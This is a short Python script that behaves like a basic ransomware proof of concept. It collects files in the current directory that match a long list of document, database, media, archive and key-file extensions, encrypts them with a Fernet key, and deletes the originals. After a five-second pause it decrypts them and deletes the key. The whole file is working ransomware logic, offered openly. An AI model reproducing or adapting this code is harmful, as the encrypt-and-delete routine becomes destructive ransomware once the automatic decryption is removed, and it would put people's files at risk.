from cryptography.fernet import Fernet
import os
import time

file_extensions = [
    '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', 
    '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', 
    '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', 
    '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', 
    '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', 
    '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', 
    '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', 
    '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', 
    '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', 
    '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', 
    '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', 
    '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', 
    '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', 
    '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', 
    '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', 
    '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', 
    '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', 
    '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', 
    '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', 
    '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', 
    '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc'
]

def generate_key():
    '''
    Generate a key and save it in key.key
    '''
    key = Fernet.generate_key()
    with open ('key', 'wb') as key_file:
        key_file.write(key)
    return key

def encrypt_file(cryptography, all_files):
    '''
    Encrypt all files in the list
    '''
    for file in all_files:
        with open(file, 'r') as file_no_crypto:
            file_data = file_no_crypto.read()
        
        content_file_crypto = cryptography.encrypt(file_data.encode())

        with open(file + ".ft", 'wb') as file_crypto:
            file_crypto.write(content_file_crypto)

def decrypt_files(cryptography, all_files):
    for file in all_files:
        with open (file + '.ft', 'r') as file_crypto:
            file_data = file_crypto.read()

        file_content = cryptography.decrypt(file_data)

        with open(file, 'wb') as file_no_crypto:
            file_no_crypto.write(file_content)
    

def remove_not_encrypted_files(all_files):
    for file in all_files:
        os.remove(file)

def remove_encrypted_files(all_files):
    for file in all_files:
        os.remove(file + '.ft')
    os.remove('key')

def select_files_with_good_extension():
    '''
    Select all files with good extension
    '''
    all_files = os.listdir()
    files = []
    for file in all_files:
        for extension in file_extensions:
            if file.endswith(extension):
                files.append(file)
    return files


def main():
    all_files = select_files_with_good_extension()
    key = generate_key()
    cryptography = Fernet(key)
    encrypt_file(cryptography, all_files)
    remove_not_encrypted_files(all_files)
    print("All files encrypted")
    time.sleep(5)
    decrypt_files(cryptography, all_files)
    remove_encrypted_files(all_files)


main()